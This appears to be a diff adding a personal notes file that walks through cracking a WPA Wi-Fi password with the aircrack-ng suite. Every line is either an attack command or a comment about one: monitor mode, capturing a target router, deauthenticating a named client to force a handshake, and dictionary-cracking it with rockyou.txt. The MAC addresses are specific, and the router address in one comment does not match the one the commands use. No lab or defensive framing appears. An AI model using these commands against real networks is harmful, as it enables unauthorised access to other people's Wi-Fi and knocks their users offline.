@@ -1,0 +1,16 @@
+airmon-ng start wlan0
+
+airodump-ng wlan0
+// get router mac address
+// A4:33:D7:77:C2:34
+// also remember to get the radio channel of this network
+
+airodump-ng -c 11 --bssid A4:33:D7:04:4B:98 -w network_name wlan0mon
+// get client mac address from router
+// 08:8C:2C:2B:1F:49
+
+// deauth him to get the handshake
+aireplay-ng -0 15 -a A4:33:D7:04:4B:98 -c 08:8C:2C:2B:1F:49 wlan0mon
+
+// once you get the cap file, you are now able to crack it
+aircrack-ng -a2 -b A4:33:D7:04:4B:98 -w /usr/share/wordlists/rockyou.txt ~/*.cap
